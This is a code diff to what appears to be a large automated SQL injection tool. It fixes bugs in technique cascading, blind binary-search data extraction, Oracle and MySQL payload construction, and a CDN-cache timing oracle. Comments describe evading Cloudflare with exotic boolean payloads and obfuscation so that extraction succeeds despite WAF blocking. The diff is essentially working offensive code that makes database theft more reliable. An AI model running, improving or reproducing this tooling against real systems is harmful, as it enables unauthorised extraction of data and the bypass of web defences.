@@ -109452,14 +109452,20 @@ class TechniqueCascadeEngine:
                     # (Welch t-test, FP-guard checks A-E) catch any false positives.
                     _timing_only_techs = {"T", "TH", "HQ", "BT", "S", "DS"}
                     _set_by_instab = getattr(self.config, "_oracle_set_by_instability", False)
-                    if _set_by_instab:
-                        # Instability-triggered: also ban WAF-bypass boolean techniques
-                        # because the page itself is unreliable — bypass won't help.
+                    if not _set_by_instab:
+                        # BUG-SECONDARY-TIMINGONLY-GATE-INVERTED FIX: was `if _set_by_instab:`
+                        # which added ST/NV/WB/EX/HY to the allowed set only for INSTABILITY
+                        # (where they should be BANNED) and excluded them for WAF-BLOCKING
+                        # (where they should be ALLOWED). Condition inverted to match intent.
+                        #
+                        # WAF-blocking-triggered TIMING_ONLY: ST/NV/WB/EX/HY use exotic
+                        # boolean payloads (||, !~~, ARRAY_LOWER, LN() etc.) that Cloudflare
+                        # cannot pattern-match. Add them to the allowed set so they proceed.
                         _timing_only_techs = _timing_only_techs | {
                             "ST", "NV", "WB", "EX", "HY",
                             "B", "BH", "IN", "UE", "UH"}
-                    # (WAF-blocking-triggered: ST/NV/WB/EX/HY are NOT in the skip set
-                    #  so they proceed — their bypass payloads may work where T can't)
+                    # (Instability-triggered: ST/NV/WB/EX/HY NOT added — page is unstable,
+                    #  boolean bypass will produce false positives; skip them correctly)
                     if tech not in _timing_only_techs:
                         continue  # skip non-timing technique in TIMING_ONLY mode silently
                 self._techs_tried.append(f"{dbms}:{tech}")
@@ -110337,18 +110343,36 @@ class TechniqueCascadeEngine:
                                     _nd_blk = getattr(self, '_dbms_block_run', {}).get(dbms, 0)
                                     if _nd_blk == _pre_probe_block_run:
                                         # No WAF block → true no-diff (200, no detection signal)
-                                        _nd_cur = self._nodiff_streak.get(_nd_key, 0) + 1
+                                        # BUG-NODIFF-COUNTER-SHARED-SURFACE-RACE FIX:
+                                        # _nodiff_streak is a shared instance dict. When 3
+                                        # concurrent surface coroutines (country, X-Forwarded-For,
+                                        # X-Real-IP) scan EH in parallel, they all read/write the
+                                        # same counter. Surface 1 fires at count=100, resets to 0;
+                                        # surfaces 2 and 3 restart accumulation from 0 and need
+                                        # another ~100 probes each → ~300 probes total instead of 100.
+                                        # Fix: use sentinel -1 to mark "already rotated". Surfaces
+                                        # that see -1 immediately break without re-accumulating.
+                                        _nd_cur_stored = self._nodiff_streak.get(_nd_key, 0)
+                                        if _nd_cur_stored < 0:
+                                            # Sibling surface already fired rotation → join it
+                                            _t22_advance_dbms = True
+                                            break
+                                        _nd_cur = _nd_cur_stored + 1
                                         self._nodiff_streak[_nd_key] = _nd_cur
                                         if _nd_cur >= _NODIFF_ROTATE_AFTER:
                                             print(f"[*] [TECH-NODIFF] {dbms}:{tech}: "
                                                   f"{_nd_cur} consecutive no-diff responses "
                                                   f"— rotating to next tech", flush=True)
-                                            self._nodiff_streak[_nd_key] = 0
+                                            # Sentinel -1: other concurrent surfaces see it
+                                            # immediately and break without re-accumulating.
+                                            self._nodiff_streak[_nd_key] = -1
                                             _t22_advance_dbms = True
                                             break
                                     else:
                                         # WAF block → reset no-diff streak
-                                        self._nodiff_streak[_nd_key] = 0
+                                        # (but preserve -1 sentinel if rotation already fired)
+                                        if self._nodiff_streak.get(_nd_key, 0) >= 0:
+                                            self._nodiff_streak[_nd_key] = 0
                                 except Exception:
                                     pass
                         elif r is not None and not isinstance(r, _GateKilled):
@@ -111136,10 +111160,13 @@ class TechniqueCascadeEngine:
                         _v190_elim.record_waf_block(dbms, payload)  # T22+T25
                 except Exception:
                     pass
-                # TECHNIQUE-22: per-DBMS consecutive WAF block counter
-                if not hasattr(self, '_dbms_block_run'):
-                    self._dbms_block_run = {}
-                self._dbms_block_run[dbms] = self._dbms_block_run.get(dbms, 0) + 1
+                # BUG-EH-DOUBLE-DBMS-BLOCK-COUNTER FIX: The TECHNIQUE-22 per-DBMS consecutive
+                # WAF-block counter increment that previously appeared here (3 lines) is now
+                # handled by the GLOBAL WAF-block handler at line ~111108 which covers ALL
+                # techniques including E and EH.  Having a second identical increment here
+                # caused E/EH WAF blocks to count twice → T22 fired after 3 blocks instead of
+                # 6, making DBMS rotation twice as aggressive for E/EH probes only.
+                # Removed the redundant init+increment; the return below is kept.
                 return None
             # Primary pass: check error patterns for the targeted DBMS (or all
             # when dbms=="Generic").  This fast path avoids scanning every DBMS's
@@ -136199,7 +136226,17 @@ class AdaptiveFrequencyExtractor:
         # TiDB, CockroachDB, YugabyteDB were fixed (BUG-AFE-PARENT-CHAR-HI FIX)
         # but Amazon Redshift was missed.
         # Numeric safety: _afe_char_hi is a binary-search ceiling only; never in SQL.
-        _afe_char_hi = (65535 if _afe_dbms_hi in ("MSSQL", "Sybase")
+        # BUG-AFE-ORACLE-CHAR-HI FIX (MEDIUM, Oracle, AdaptiveFrequencyExtractor,
+        # all B/BH/T/TH extraction techniques, all surfaces, all HTTP methods):
+        # Oracle was absent from both the 65535 and 1114111 branches, falling to
+        # else 255. The Oracle char_func uses CASE/ASCIISTR which returns 0-65535
+        # (full BMP). With ceiling=255, binary search converges at lo=255→chr(255)='ÿ'
+        # for any Oracle character with code point 256-65535 (Latin Extended, CJK,
+        # Arabic, Hebrew, Cyrillic, etc.). Silent corruption affects all Oracle
+        # targets serving globalised applications. Fix: add Oracle to the 65535 branch
+        # alongside MSSQL/Sybase (all three use ASCIISTR/UNICODE→BMP range 0-65535).
+        # Matches _build_dbms_char_hi("Oracle") which already returns 65535.
+        _afe_char_hi = (65535 if _afe_dbms_hi in ("MSSQL", "Sybase", "Oracle")
                         else 1114111 if _afe_dbms_hi in (
                             "SQLite", "MySQL", "MariaDB", "TiDB",
                             "PostgreSQL", "CockroachDB", "YugabyteDB",
@@ -146626,6 +146663,19 @@ class NovelWAFBypassExtractor:
                                     _else_branch = _cond_m.group(3)
                                     _test_payload_obf = (f"CASE WHEN ({_obf_cond}) "
                                                          f"THEN {_then_branch} ELSE {_else_branch} END")
+                                elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                                    # BUG-CACHE-ORACLE-MYSQL-IF-REGEX FIX: MySQL/MariaDB/TiDB use
+                                    # IF((cond),MD5(RAND()),VERSION()) not CASE WHEN ... END, so
+                                    # the CASE WHEN regex never matches and the fallback below
+                                    # obfuscated the ENTIRE payload including THEN/ELSE branches.
+                                    # Obfuscating MD5(RAND()) or VERSION() makes the ELSE result
+                                    # non-deterministic (different obfuscation seed each probe →
+                                    # different SQL text → CDN sees a different "version()" call
+                                    # each time → can't cache → FALSE signal (cache hit) is lost
+                                    # → oracle is blind for MySQL). Fix: reconstruct IF() directly
+                                    # using only the obfuscated condition; keep THEN/ELSE branches
+                                    # literal so caching determinism is preserved.
+                                    _test_payload_obf = f"IF(({_obf_cond}),MD5(RAND()),VERSION())"
                                 else:
                                     # Fallback: can't parse structure, obfuscate whole payload
                                     _test_payload_obf = apply_heavy_variation(
@@ -146638,7 +146688,18 @@ class NovelWAFBypassExtractor:
 
                             # Send FIRST time: prime the CDN cache (response may or may
                             # not be cached depending on whether condition is TRUE/FALSE)
-                            _fp1 = await send_fn(_test_payload_obf)
+                            # BUG-CACHE-ORACLE-TUPLE-UNPACK FIX: send_fn (_novel_send) returns
+                            # a (fp, ms) tuple. Previous code assigned the raw tuple to _fp1/_fp2,
+                            # then called getattr(tuple, 'status_code', 0) which always returns 0
+                            # (tuples have no .status_code attribute). WAF block detection via
+                            # _status1/2 in (400,403,429) was therefore ALWAYS FALSE → _blocked=False
+                            # → consecutive-error counter never incremented → extraction never
+                            # stopped on WAF blocks. Fast WAF-block responses (~50ms) were treated
+                            # as oracle FALSE (char < mid), causing binary search to converge to
+                            # wrong low ASCII values (e.g. '-'=45 instead of 'P'=80). Fix: unpack
+                            # the tuple the same way the pre-validation block (line ~146493) does.
+                            _fp1r = await send_fn(_test_payload_obf)
+                            _fp1 = _fp1r[0] if isinstance(_fp1r, tuple) else _fp1r
                             await asyncio.sleep(0.2)   # give CDN time to store response
 
                             # Send SECOND time: if CDN cached the first response (condition
@@ -146651,8 +146712,9 @@ class NovelWAFBypassExtractor:
                             # works correctly. The obfuscation is deterministic per _obf_seed
                             # so both sends produce the identical obfuscated payload string.
                             _t0 = time.monotonic()
-                            _fp2 = await send_fn(_test_payload_obf)
+                            _fp2r = await send_fn(_test_payload_obf)
                             _elapsed = (time.monotonic() - _t0) * 1000
+                            _fp2 = _fp2r[0] if isinstance(_fp2r, tuple) else _fp2r
 
                             # Rate-limit, WAF block (400/403/429), or network error: treat as indeterminate
                             # BUG-CACHE-ORACLE-BLOCKED-STATUS FIX: WAF can return 400/403, not only 429
